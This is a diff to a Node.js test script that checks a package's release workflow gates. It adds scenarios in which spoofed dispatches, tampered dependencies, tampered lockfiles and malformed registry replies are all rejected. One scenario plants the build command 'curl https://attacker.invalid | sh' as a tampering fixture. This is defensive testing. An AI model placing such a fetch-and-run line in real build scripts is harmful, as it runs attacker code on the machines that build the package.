@@ -1,15 +1,19 @@
 #!/usr/bin/env node
-import { execFileSync } from "node:child_process";
+import { execFileSync, spawnSync } from "node:child_process";
 import { mkdir, mkdtemp, readFile, rm, writeFile } from "node:fs/promises";
 import { tmpdir } from "node:os";
 import { join } from "node:path";
 import { fileURLToPath } from "node:url";
 import {
   BETA_REGISTRY_SLUG,
+  EMDASH_PUBLISH_JOB_IF,
   PACKAGE_NAME,
+  repositoryRoot,
   runReleaseFlowCli,
   validateEmDashDispatchGate,
 } from "./release-flow.mjs";
+
+const GATE_SCRIPT_PATH = join(repositoryRoot, ".github/scripts/emdash-dispatch-gate.mjs");
 
 function git(args, cwd) {
   return execFileSync("git", args, {
@@ -19,36 +23,147 @@ function git(args, cwd) {
   }).trim();
 }
 
+export async function verifyShippedEmDashWorkflowGateBinding() {
+  const emdashWorkflowText = await readFile(
+    join(repositoryRoot, ".github/workflows/emdash-release.yml"),
+    "utf8",
+  );
+  const releaseWorkflowText = await readFile(
+    join(repositoryRoot, ".github/workflows/release.yml"),
+    "utf8",
+  );
+
+  const expectedIfLine = `if: ${EMDASH_PUBLISH_JOB_IF}`;
+  if (!emdashWorkflowText.includes(expectedIfLine)) {
+    throw new Error(
+      `emdash-release.yml publish job if-condition does not match expected rule: ${expectedIfLine}`,
+    );
+  }
+
+  const gateStepMatch =
+    /- name: Enforce dispatch and caller gate before credential use or Registry I\/O[\s\S]*?run:\s*node \.github\/scripts\/emdash-dispatch-gate\.mjs --github-output "\$GITHUB_OUTPUT"/.exec(
+      emdashWorkflowText,
+    );
+  if (!gateStepMatch) {
+    throw new Error(
+      "emdash-release.yml does not invoke node .github/scripts/emdash-dispatch-gate.mjs in its gate step",
+    );
+  }
+
+  const gateIdx = emdashWorkflowText.indexOf("node .github/scripts/emdash-dispatch-gate.mjs");
+  const mintIdx = emdashWorkflowText.indexOf("actions/create-github-app-token@");
+  const pdsIdx = emdashWorkflowText.indexOf("emdash-plugin publish");
+  if (gateIdx === -1 || mintIdx === -1 || pdsIdx === -1 || !(gateIdx < mintIdx && gateIdx < pdsIdx)) {
+    throw new Error(
+      "emdash-release.yml must run .github/scripts/emdash-dispatch-gate.mjs before token minting or PDS Registry publish",
+    );
+  }
+
+  if (
+    !releaseWorkflowText.includes("uses: ./.github/workflows/emdash-release.yml") ||
+    !releaseWorkflowText.includes("release_mode: stable")
+  ) {
+    throw new Error("release.yml must delegate to emdash-release.yml with release_mode: stable");
+  }
+
+  return {
+    jobIfMatches: true,
+    gateScriptInvokedBeforeCredentials: true,
+    callerPassesStableReleaseMode: true,
+  };
+}
+
+export function runExtractedGateScriptProcess({
+  eventName = "",
+  ref = "",
+  inputVersion = "",
+  releaseMode = "",
+} = {}) {
+  const proc = spawnSync(
+    process.execPath,
+    [GATE_SCRIPT_PATH],
+    {
+      cwd: repositoryRoot,
+      encoding: "utf8",
+      env: {
+        PATH: process.env.PATH || "",
+        GITHUB_EVENT_NAME: eventName,
+        EVENT_NAME: eventName,
+        GITHUB_REF: ref,
+        TARGET_REF: ref,
+        INPUT_VERSION: inputVersion,
+        INPUT_RELEASE_MODE: releaseMode,
+      },
+    },
+  );
+
+  const stdout = (proc.stdout || "").trim();
+  const stderr = (proc.stderr || "").trim();
+  let parsed = null;
+  if (proc.status === 0 && stdout) {
+    try {
+      parsed = JSON.parse(stdout.split("\n").at(-1));
+    } catch {
+      parsed = null;
+    }
+  }
+
+  return {
+    exitCode: proc.status ?? 1,
+    stdout,
+    stderr,
+    parsed,
+  };
+}
+
 async function createSeededRepo(prefix, events) {
   const root = await mkdtemp(join(tmpdir(), `payments-release-proof-${prefix}-`));
   await mkdir(join(root, ".changeset"), { recursive: true });
   await mkdir(join(root, "src"), { recursive: true });
 
-  await writeFile(
-    join(root, "package.json"),
-    `${JSON.stringify(
-      {
+  const initialPkg = {
+    name: PACKAGE_NAME,
+    version: "0.2.8",
+    type: "module",
+    scripts: {
+      build: "wrangler deploy --dry-run --outdir dist && npm run plugin:build",
+    },
+    dependencies: {
+      jose: "6.2.12",
+      stripe: "23.0.0",
+    },
+  };
+  const initialLock = {
+    name: PACKAGE_NAME,
+    version: "0.2.8",
+    lockfileVersion: 3,
+    requires: true,
+    packages: {
+      "": {
         name: PACKAGE_NAME,
         version: "0.2.8",
-        type: "module",
+        dependencies: {
+          jose: "6.2.12",
+          stripe: "23.0.0",
+        },
       },
-      null,
-      2,
-    )}\n`,
-    "utf8",
-  );
-  await writeFile(join(root, "package-lock.json"), `{"name":"@dinkuskit/payments","version":"0.2.8"}\n`, "utf8");
+      "node_modules/stripe": {
+        version: "23.0.0",
+        resolved: "https://registry.npmjs.org/stripe/-/stripe-23.0.0.tgz",
+        integrity: "sha512-stripe2300integrity==",
+      },
+    },
+  };
+
+  await writeFile(join(root, "package.json"), `${JSON.stringify(initialPkg, null, 2)}\n`, "utf8");
+  await writeFile(join(root, "package-lock.json"), `${JSON.stringify(initialLock, null, 2)}\n`, "utf8");
   await writeFile(
     join(root, "CHANGELOG.md"),
     ["# @dinkuskit/payments", "", "## 0.2.8", "", "- Baseline release."].join("\n") + "\n",
     "utf8",
   );
   await writeFile(join(root, "src/plugin.ts"), `export const pluginVersion = "0.2.8";\n`, "utf8");
-  await writeFile(
-    join(root, ".changeset/README.md"),
-    "# Changesets\n",
-    "utf8",
-  );
+  await writeFile(join(root, ".changeset/README.md"), "# Changesets\n", "utf8");
   await writeFile(
     join(root, ".changeset/add-feature.md"),
     `---\n"${PACKAGE_NAME}": patch\n---\n\nFix checkout callback status handling.\n`,
@@ -85,6 +200,7 @@ function createStubEnvironment({
   stableVersions = [],
   githubReleases = new Set(),
   registryError = null,
+  customRegistryResponse = null,
 } = {}) {
   const state = {
     betaVersions: [...betaVersions],
@@ -98,6 +214,9 @@ function createStubEnvironment({
     const urlStr = String(url);
     const slug = decodeURIComponent(urlStr.split("/").pop() || "");
     events.push(`registry:get:${slug}`);
+    if (typeof customRegistryResponse === "function") {
+      return customRegistryResponse(slug);
+    }
     if (registryError) {
       if (registryError.type === "network") {
         throw new Error(registryError.message || "socket hang up");
@@ -166,11 +285,15 @@ function createStubEnvironment({
       const pkg = JSON.parse(await readFile(pkgPath, "utf8"));
       pkg.version = "0.2.9";
       await writeFile(pkgPath, `${JSON.stringify(pkg, null, 2)}\n`, "utf8");
-      await writeFile(
-        join(cwd, "package-lock.json"),
-        `{"name":"@dinkuskit/payments","version":"0.2.9"}\n`,
-        "utf8",
-      );
+
+      const lockPath = join(cwd, "package-lock.json");
+      const lock = JSON.parse(await readFile(lockPath, "utf8"));
+      lock.version = "0.2.9";
+      if (lock.packages?.[""]) {
+        lock.packages[""].version = "0.2.9";
+      }
+      await writeFile(lockPath, `${JSON.stringify(lock, null, 2)}\n`, "utf8");
+
       await writeFile(
         join(cwd, "CHANGELOG.md"),
         [
@@ -199,26 +322,52 @@ function createStubEnvironment({
 async function runWorkflowDispatchSimulation({
   eventName,
   ref,
-  inputVersion,
+  inputVersion = "",
+  releaseMode = "",
   events,
   runCutBeta,
   runPublish,
 }) {
-  events.push(`workflow:emdash-release:start:event=${eventName}:ref=${ref}:version=${inputVersion || "(auto)"}`);
-  const gate = validateEmDashDispatchGate({ eventName, ref, inputVersion });
-  if (!gate.ok) {
-    events.push(`workflow:emdash-release:rejected:${gate.code}`);
-    return { ok: false, gate };
+  events.push(
+    `workflow:emdash-release:start:event=${eventName}:ref=${ref}:mode=${releaseMode || "(none)"}:version=${inputVersion || "(auto)"}`,
+  );
+
+  // Execute the real extracted workflow gate script as a child process
+  const scriptResult = runExtractedGateScriptProcess({
+    eventName,
+    ref,
+    inputVersion,
+    releaseMode,
+  });
+  const jsGate = validateEmDashDispatchGate({
+    eventName,
+    ref,
+    inputVersion,
+    releaseMode,
+  });
+
+  if (Boolean(scriptResult.exitCode === 0) !== jsGate.ok) {
+    throw new Error(
+      `Gate script / JS mismatch for event=${eventName} ref=${ref} version=${inputVersion} mode=${releaseMode}: scriptExit=${scriptResult.exitCode}, jsOk=${jsGate.ok}`,
+    );
   }
+
+  if (!jsGate.ok) {
+    events.push(`workflow:emdash-release:gate-script:exit=${scriptResult.exitCode}:code=${jsGate.code}`);
+    return { ok: false, gate: jsGate, scriptResult };
+  }
+
+  events.push(`workflow:emdash-release:gate-script:exit=0:mode=${jsGate.mode}`);
   if (eventName === "workflow_dispatch") {
     events.push("credential:mint-github-app-token:[REDACTED]");
     await runCutBeta();
   }
-  await runPublish(gate.slug, gate.requestedVersion);
-  return { ok: true, gate };
+  await runPublish(jsGate.slug, jsGate.requestedVersion);
+  return { ok: true, gate: jsGate, scriptResult };
 }
 
 export async function runReleaseAuthorityProof() {
+  const workflowBinding = await verifyShippedEmDashWorkflowGateBinding();
   const scenarios = [];
 
   // Scenario (a): Approved main release path succeeds and performs tag, GitHub Release, Registry publish
@@ -278,7 +427,7 @@ export async function runReleaseAuthorityProof() {
         },
       );
 
-      // 3. Merge ci: release PR to main and run publish-merged-release + delegated emdash-release.yml
+      // 3. Merge ci: release PR to main and run publish-merged-release + delegated emdash-release.yml (event=push, release_mode=stable)
       git(["checkout", "main"], root);
       git(["merge", "--ff-only", "changeset-release/main"], root);
       events.push("workflow:release:push:refs/heads/main");
@@ -293,9 +442,10 @@ export async function runReleaseAuthorityProof() {
 
       if (publishResult.published || publishResult.registryNeeded) {
         await runWorkflowDispatchSimulation({
-          eventName: "workflow_call",
+          eventName: "push",
           ref: "refs/heads/main",
           inputVersion: publishResult.version,
+          releaseMode: "stable",
           events,
           runCutBeta: async () => {},
           runPublish: async (slug, version) => {
@@ -359,6 +509,7 @@ export async function runReleaseAuthorityProof() {
       outcome: {
         ok: res.ok,
         code: res.gate.code,
+        scriptExitCode: res.scriptResult.exitCode,
         credentialOrRegistryIoCount: 0,
       },
       sideEffects: events,
@@ -393,6 +544,7 @@ export async function runReleaseAuthorityProof() {
       outcome: {
         ok: res.ok,
         code: res.gate.code,
+        scriptExitCode: res.scriptResult.exitCode,
         credentialOrRegistryIoCount: 0,
       },
       sideEffects: events,
@@ -526,11 +678,12 @@ export async function runReleaseAuthorityProof() {
         throw new Error(`Scenario (e) failed: unexpected resume state ${JSON.stringify(resumed)}`);
       }
 
-      // Downstream Registry job runs because published/registry_needed == true
+      // Downstream Registry job runs with caller event=push and release_mode=stable
       await runWorkflowDispatchSimulation({
-        eventName: "workflow_call",
+        eventName: "push",
         ref: "refs/heads/main",
         inputVersion: resumed.version,
+        releaseMode: "stable",
         events,
         runCutBeta: async () => {},
         runPublish: async (slug, version) => {
@@ -615,12 +768,7 @@ export async function runReleaseAuthorityProof() {
     const events = [];
     const { root, gitExec } = await createSeededRepo("empty-changeset", events);
     try {
-      // Add an explicit `changeset --empty` file alongside the patch changeset
-      await writeFile(
-        join(root, ".changeset/empty-note.md"),
-        `---\n---\n`,
-        "utf8",
-      );
+      await writeFile(join(root, ".changeset/empty-note.md"), `---\n---\n`, "utf8");
       git(["add", ".changeset/empty-note.md"], root);
       git(["commit", "-m", "docs: add empty changeset"], root);
 
@@ -671,8 +819,383 @@ export async function runReleaseAuthorityProof() {
     }
   }
 
+  // Scenario (h): Reusable-call handoff with caller event `push` on refs/heads/main + release_mode=stable proceeds
+  {
+    const events = [];
+    const { root, gitExec } = await createSeededRepo("reusable-call-handoff", events);
+    try {
+      const env = createStubEnvironment({ events, betaVersions: ["0.2.9-beta.1"], stableVersions: [] });
+      git(["tag", "v0.2.9-beta.1", "HEAD"], root);
+      await runReleaseFlowCli(
+        [
+          "promote",
+          "--beta-version",
+          "0.2.9-beta.1",
+          "--proof-ref",
+          "run-708 0.2.9-beta.1 @running pass",
+        ],
+        {
+          root,
+          gitExec,
+          ghExec: env.ghExec,
+          fetchImpl: env.fetchImpl,
+          npmExec: env.npmExec,
+          log: () => {},
+        },
+      );
+      git(["checkout", "main"], root);
+      git(["merge", "--ff-only", "changeset-release/main"], root);
+      events.length = 0;
+
+      events.push("workflow:release:push:refs/heads/main");
+      events.push("credential:mint-github-app-token:[REDACTED]");
+      const publishResult = await runReleaseFlowCli(["publish-merged-release"], {
+        root,
+        gitExec,
+        ghExec: env.ghExec,
+        fetchImpl: env.fetchImpl,
+        log: () => {},
+      });
+
+      const handoff = await runWorkflowDispatchSimulation({
+        eventName: "push",
+        ref: "refs/heads/main",
+        inputVersion: publishResult.version,
+        releaseMode: "stable",
+        events,
+        runCutBeta: async () => {
+          events.push("UNEXPECTED:cut-beta");
+        },
+        runPublish: async (slug, version) => {
+          const check = await runReleaseFlowCli(
+            ["check-registry-version", "--slug", slug, "--version", version],
+            { root, gitExec, ghExec: env.ghExec, fetchImpl: env.fetchImpl, log: () => {} },
+          );
+          if (!check.alreadyPublished) {
+            events.push(`credential:pds-auth:[REDACTED]`);
+            events.push(`registry:publish:${slug}@${version}`);
+            env.state.stableVersions.push(version);
+          }
+        },
+      });
+
+      if (
+        !handoff.ok ||
+        handoff.gate.mode !== "stable-call" ||
+        !publishResult.tagCreated ||
+        !publishResult.githubReleaseCreated ||
+        !env.state.stableVersions.includes("0.2.9")
+      ) {
+        throw new Error("Scenario (h) failed: delegated push + release_mode=stable did not complete stable publication");
+      }
+
+      scenarios.push({
+        id: "h",
+        name: "reusable_call_push_event_with_stable_input_proceeds",
+        status: "PASS",
+        outcome: {
+          callerEvent: "push",
+          releaseMode: "stable",
+          gateScriptExitCode: handoff.scriptResult.exitCode,
+          tagCreated: publishResult.tagCreated,
+          githubReleaseCreated: publishResult.githubReleaseCreated,
+          registryPublished: env.state.stableVersions.includes("0.2.9"),
+        },
+        sideEffects: events,
+      });
+    } finally {
+      await rm(root, { recursive: true, force: true });
+    }
+  }
+
+  // Scenario (i): Manual workflow_dispatch attempting stable version OR passing release_mode=stable by hand is rejected before credentials/Registry I/O
+  {
+    const events = [];
+    const attemptStableVersion = await runWorkflowDispatchSimulation({
+      eventName: "workflow_dispatch",
+      ref: "refs/heads/main",
+      inputVersion: "0.2.9",
+      releaseMode: "",
+      events,
+      runCutBeta: async () => events.push("UNEXPECTED:cut-beta"),
+      runPublish: async () => events.push("UNEXPECTED:publish"),
+    });
+    const attemptStableModeSpoof = await runWorkflowDispatchSimulation({
+      eventName: "workflow_dispatch",
+      ref: "refs/heads/main",
+      inputVersion: "0.2.9",
+      releaseMode: "stable",
+      events,
+      runCutBeta: async () => events.push("UNEXPECTED:cut-beta"),
+      runPublish: async () => events.push("UNEXPECTED:publish"),
+    });
+    const touchedCredsOrRegistry = events.some(
+      (e) => e.startsWith("credential:") || e.startsWith("registry:") || e.startsWith("git:") || e.startsWith("UNEXPECTED:"),
+    );
+    if (attemptStableVersion.ok || attemptStableModeSpoof.ok || touchedCredsOrRegistry) {
+      throw new Error("Scenario (i) failed: manual workflow_dispatch stable spoof was not rejected");
+    }
+
+    scenarios.push({
+      id: "i",
+      name: "manual_workflow_dispatch_stable_version_or_mode_rejected_before_credentials",
+      status: "PASS",
+      outcome: {
+        stableVersionRejectedCode: attemptStableVersion.gate.code,
+        stableModeSpoofRejectedCode: attemptStableModeSpoof.gate.code,
+        scriptExitCodes: [
+          attemptStableVersion.scriptResult.exitCode,
+          attemptStableModeSpoof.scriptResult.exitCode,
+        ],
+        credentialOrRegistryIoCount: 0,
+      },
+      sideEffects: events,
+    });
+  }
+
+  // Scenario (j): Push event WITHOUT stable caller input and push on a non-main ref are both rejected before credentials/Registry I/O
+  {
+    const events = [];
+    const pushWithoutInput = await runWorkflowDispatchSimulation({
+      eventName: "push",
+      ref: "refs/heads/main",
+      inputVersion: "0.2.9",
+      releaseMode: "",
+      events,
+      runCutBeta: async () => events.push("UNEXPECTED:cut-beta"),
+      runPublish: async () => events.push("UNEXPECTED:publish"),
+    });
+    const pushOnNonMain = await runWorkflowDispatchSimulation({
+      eventName: "push",
+      ref: "refs/heads/feat/rogue-push",
+      inputVersion: "0.2.9",
+      releaseMode: "stable",
+      events,
+      runCutBeta: async () => events.push("UNEXPECTED:cut-beta"),
+      runPublish: async () => events.push("UNEXPECTED:publish"),
+    });
+    const touchedCredsOrRegistry = events.some(
+      (e) => e.startsWith("credential:") || e.startsWith("registry:") || e.startsWith("git:") || e.startsWith("UNEXPECTED:"),
+    );
+    if (pushWithoutInput.ok || pushOnNonMain.ok || touchedCredsOrRegistry) {
+      throw new Error("Scenario (j) failed: push without stable caller input or non-main ref was not rejected");
+    }
+
+    scenarios.push({
+      id: "j",
+      name: "push_without_stable_caller_input_and_non_main_ref_rejected",
+      status: "PASS",
+      outcome: {
+        pushWithoutInputCode: pushWithoutInput.gate.code,
+        pushOnNonMainCode: pushOnNonMain.gate.code,
+        scriptExitCodes: [
+          pushWithoutInput.scriptResult.exitCode,
+          pushOnNonMain.scriptResult.exitCode,
+        ],
+        credentialOrRegistryIoCount: 0,
+      },
+      sideEffects: events,
+    });
+  }
+
+  // Scenario (k): Dependency change and script change in package.json / lockfile after beta approval rejected before tag
+  {
+    const events = [];
+    const { root, gitExec } = await createSeededRepo("tampered-pkg-metadata", events);
+    try {
+      const env = createStubEnvironment({ events, betaVersions: [] });
+      const cut = await runReleaseFlowCli(["cut-beta"], {
+        root,
+        gitExec,
+        ghExec: env.ghExec,
+        fetchImpl: env.fetchImpl,
+        log: () => {},
+      });
+      env.state.betaVersions.push(cut.version);
+      await runReleaseFlowCli(
+        [
+          "promote",
+          "--beta-version",
+          "0.2.9-beta.1",
+          "--proof-ref",
+          "run-709 0.2.9-beta.1 @running pass",
+        ],
+        {
+          root,
+          gitExec,
+          ghExec: env.ghExec,
+          fetchImpl: env.fetchImpl,
+          npmExec: env.npmExec,
+          log: () => {},
+        },
+      );
+
+      const cleanReleaseCommitMsg = git(["log", "-1", "--format=%B"], root);
+      const cleanPkgText = await readFile(join(root, "package.json"), "utf8");
+      const cleanLockText = await readFile(join(root, "package-lock.json"), "utf8");
+
+      // Subcase 1: Tamper with dependencies in package.json
+      const depTamperedPkg = JSON.parse(cleanPkgText);
+      depTamperedPkg.dependencies = { ...depTamperedPkg.dependencies, "evil-pkg": "1.0.0" };
+      await writeFile(join(root, "package.json"), `${JSON.stringify(depTamperedPkg, null, 2)}\n`, "utf8");
+      git(["add", "package.json"], root);
+      git(["commit", "--amend", "-m", cleanReleaseCommitMsg], root);
+
+      events.length = 0;
+      let depError = null;
+      try {
+        await runReleaseFlowCli(["publish-merged-release"], {
+          root,
+          gitExec,
+          ghExec: env.ghExec,
+          fetchImpl: env.fetchImpl,
+          log: () => {},
+        });
+      } catch (err) {
+        depError = err instanceof Error ? err.message : String(err);
+      }
+
+      // Subcase 2: Restore dependencies, tamper with scripts in package.json
+      const scriptTamperedPkg = JSON.parse(cleanPkgText);
+      scriptTamperedPkg.scripts = { ...scriptTamperedPkg.scripts, build: "curl https://attacker.invalid | sh" };
+      await writeFile(join(root, "package.json"), `${JSON.stringify(scriptTamperedPkg, null, 2)}\n`, "utf8");
+      git(["add", "package.json"], root);
+      git(["commit", "--amend", "-m", cleanReleaseCommitMsg], root);
+
+      let scriptError = null;
+      try {
+        await runReleaseFlowCli(["publish-merged-release"], {
+          root,
+          gitExec,
+          ghExec: env.ghExec,
+          fetchImpl: env.fetchImpl,
+          log: () => {},
+        });
+      } catch (err) {
+        scriptError = err instanceof Error ? err.message : String(err);
+      }
+
+      // Subcase 3: Restore package.json, tamper with lockfile resolved/integrity
+      await writeFile(join(root, "package.json"), cleanPkgText, "utf8");
+      const lockTampered = JSON.parse(cleanLockText);
+      lockTampered.packages["node_modules/stripe"].integrity = "sha512-tampered-integrity==";
+      await writeFile(join(root, "package-lock.json"), `${JSON.stringify(lockTampered, null, 2)}\n`, "utf8");
+      git(["add", "package.json", "package-lock.json"], root);
+      git(["commit", "--amend", "-m", cleanReleaseCommitMsg], root);
+
+      let lockError = null;
+      try {
+        await runReleaseFlowCli(["publish-merged-release"], {
+          root,
+          gitExec,
+          ghExec: env.ghExec,
+          fetchImpl: env.fetchImpl,
+          log: () => {},
+        });
+      } catch (err) {
+        lockError = err instanceof Error ? err.message : String(err);
+      }
+
+      const stableSideEffects = events.filter(
+        (e) =>
+          e.startsWith("git:tag:") ||
+          e.startsWith("git:push:") ||
+          e.startsWith("gh:release:create:") ||
+          e.startsWith("registry:"),
+      );
+      if (!depError || !scriptError || !lockError || stableSideEffects.length > 0) {
+        throw new Error(
+          `Scenario (k) failed: depError=${depError}, scriptError=${scriptError}, lockError=${lockError}, sideEffects=${stableSideEffects.length}`,
+        );
+      }
+
+      scenarios.push({
+        id: "k",
+        name: "dependency_script_and_lockfile_changes_after_beta_rejected_before_tag",
+        status: "PASS",
+        outcome: {
+          dependencyChangeRejected: depError,
+          scriptChangeRejected: scriptError,
+          lockfileIntegrityChangeRejected: lockError,
+          stableSideEffectsCount: stableSideEffects.length,
+        },
+        sideEffects: events,
+      });
+    } finally {
+      await rm(root, { recursive: true, force: true });
+    }
+  }
+
+  // Scenario (l): Malformed Registry 200 (`{}`, error-shaped object, malformed entry) aborts cut-beta before tag
+  {
+    const events = [];
+    const { root, gitExec } = await createSeededRepo("malformed-registry-200", events);
+    try {
+      const payloads = [
+        { label: "empty_object", body: {} },
+        { label: "error_shaped_200", body: { error: "RateLimited", message: "try later" } },
+        { label: "malformed_version_entry", body: { plugin: { slug: BETA_REGISTRY_SLUG }, versions: [{ version: "0.2.9-beta.1" }, { bad: true }] } },
+      ];
+      const errors = {};
+
+      for (const item of payloads) {
+        const env = createStubEnvironment({
+          events,
+          customRegistryResponse: () => ({
+            ok: true,
+            status: 200,
+            json: async () => item.body,
+          }),
+        });
+        try {
+          await runReleaseFlowCli(["cut-beta"], {
+            root,
+            gitExec,
+            ghExec: env.ghExec,
+            fetchImpl: env.fetchImpl,
+            log: () => {},
+          });
+        } catch (err) {
+          errors[item.label] = err instanceof Error ? err.message : String(err);
+        }
+      }
+
+      const betaTags = git(["tag", "--list", "v0.2.9-beta.*"], root)
+        .split("\n")
+        .filter(Boolean);
+      const anyTagSideEffect = events.some((e) => e.startsWith("git:tag:") || e.startsWith("git:push:"));
+      if (
+        !errors.empty_object ||
+        !errors.error_shaped_200 ||
+        !errors.malformed_version_entry ||
+        betaTags.length > 0 ||
+        anyTagSideEffect
+      ) {
+        throw new Error(
+          `Scenario (l) failed: errors=${JSON.stringify(errors)}, betaTags=${betaTags.length}`,
+        );
+      }
+
+      scenarios.push({
+        id: "l",
+        name: "malformed_registry_200_responses_abort_cut_beta_before_tag",
+        status: "PASS",
+        outcome: {
+          emptyObjectError: errors.empty_object,
+          errorShaped200Error: errors.error_shaped_200,
+          malformedEntryError: errors.malformed_version_entry,
+          betaTagsCreated: betaTags.length,
+        },
+        sideEffects: events,
+      });
+    } finally {
+      await rm(root, { recursive: true, force: true });
+    }
+  }
+
   return {
     proof: "release-authority-proof",
+    workflowBinding,
     allPassed: scenarios.every((s) => s.status === "PASS"),
     scenarioCount: scenarios.length,
     scenarios,
